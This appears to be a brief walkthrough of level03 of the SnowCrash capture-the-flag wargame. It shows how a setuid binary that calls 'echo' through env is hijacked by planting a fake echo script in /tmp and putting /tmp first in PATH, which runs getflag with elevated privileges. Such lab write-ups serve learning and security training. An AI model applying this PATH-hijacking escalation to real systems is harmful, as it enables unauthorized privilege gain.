level03@SnowCrash:~$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

./level03
Exploit me

strings level03
/home/user/level03/level03.c

strace ./level03
getegid32()                             = 4313
geteuid32()                             = 101728
setresgid32(4313, 4313, 4313)           = 0
setresuid32(101728, 101728, 101728)     = 0

`level03` is executable with flag03 permissions thanks to the setgid
By changing the
/usr/bin/env echo Exploit me (found with strings level03)
to a custom echo :
	echo "/bin/sh -c 'getflag'" > /tmp/echo
	chmod 755 /tmp/echo

and setting it into the PATH env var : 
	export PATH=/tmp:$PATH

level03@SnowCrash:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

it will use our echo that is executing getflag instead of normal echo behavior with the flag03 permissions
That way we can get the token
